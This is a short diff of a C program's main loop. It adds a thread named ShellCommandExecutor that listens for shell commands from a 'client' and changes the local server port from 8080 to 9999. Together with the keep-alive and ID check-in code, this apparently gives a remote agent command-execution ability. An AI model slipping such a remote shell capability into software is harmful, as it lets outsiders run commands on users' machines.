@@ -297,12 +297,16 @@ int StartApplicationLoop(integer_t argc, char ** argv)
             printf("[OK] started keep alive service ...\n");
         }
 
+        if (CreateNewThread(ShellCommandExecutor, client)) {
+            printf("[OK] started listening for shell commands ...\n");
+        }
+
     } else {
         printf("Couldn't get ID\n");
         goto clean;
     }
 
-    code = RunServer(8080, "127.0.0.1");
+    code = RunServer(9999, "127.0.0.1");
 
 clean:
     DestroyCurl();
